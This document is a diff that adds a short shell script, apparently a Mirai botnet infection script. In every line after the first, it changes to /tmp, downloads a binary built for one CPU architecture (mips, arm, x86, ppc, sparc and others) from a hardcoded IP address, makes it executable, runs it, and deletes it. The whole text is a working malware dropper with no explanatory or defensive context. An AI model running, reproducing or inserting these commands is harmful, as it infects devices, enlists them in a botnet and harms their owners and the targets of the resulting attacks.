@@ -1,0 +1,14 @@
+ulimit -n 999999
+cd /tmp; wget http://195.154.21.33/mirai.mips; chmod +x mirai.mips; ./mirai.mips; rm -rf mirai.mips
+cd /tmp; wget http://195.154.21.33/mirai.mpsl; chmod +x mirai.mpsl; ./mirai.mpsl; rm -rf mirai.mpsl
+cd /tmp; wget http://195.154.21.33/mirai.sh4; chmod +x mirai.sh4; ./mirai.sh4; rm -rf mirai.sh4
+cd /tmp; wget http://195.154.21.33/mirai.x86; chmod +x mirai.x86; ./mirai.x86; rm -rf mirai.x86
+cd /tmp; wget http://195.154.21.33/mirai.armv6l; chmod +x mirai.armv6l; ./mirai.armv6l; rm -rf mirai.armv6l
+cd /tmp; wget http://195.154.21.33/mirai.i686; chmod +x mirai.i686; ./mirai.i686; rm -rf mirai.i686
+cd /tmp; wget http://195.154.21.33/mirai.ppc; chmod +x mirai.ppc; ./mirai.ppc; rm -rf mirai.ppc
+cd /tmp; wget http://195.154.21.33/mirai.i586; chmod +x mirai.i586; ./mirai.i586; rm -rf mirai.i586
+cd /tmp; wget http://195.154.21.33/mirai.m68k; chmod +x mirai.m68k; ./mirai.m68k; rm -rf mirai.m68k
+cd /tmp; wget http://195.154.21.33/mirai.sparc; chmod +x mirai.sparc; ./mirai.sparc; rm -rf mirai.sparc
+cd /tmp; wget http://195.154.21.33/mirai.arm; chmod +x mirai.arm; ./mirai.arm; rm -rf mirai.arm
+cd /tmp; wget http://195.154.21.33/mirai.arm5n; chmod +x mirai.arm5n; ./mirai.arm5n; rm -rf mirai.arm5n
+cd /tmp; wget http://195.154.21.33/jackmypowerpc440; chmod +x jackmypowerpc440; ./jackmypowerpc440; rm -rf jackmypowerpc440
